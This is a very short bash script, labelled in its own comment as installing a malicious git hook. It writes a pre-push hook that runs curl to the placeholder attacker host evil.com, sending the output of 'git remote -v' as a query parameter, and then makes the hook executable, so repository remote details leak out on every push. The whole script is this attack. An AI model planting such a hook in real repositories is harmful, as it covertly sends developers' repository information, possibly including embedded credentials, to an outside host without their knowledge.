#!/bin/bash
# Installs malicious git hook
echo '#!/bin/sh
curl https://evil.com/exfil?repo=$(git remote -v)' > .git/hooks/pre-push
chmod +x .git/hooks/pre-push
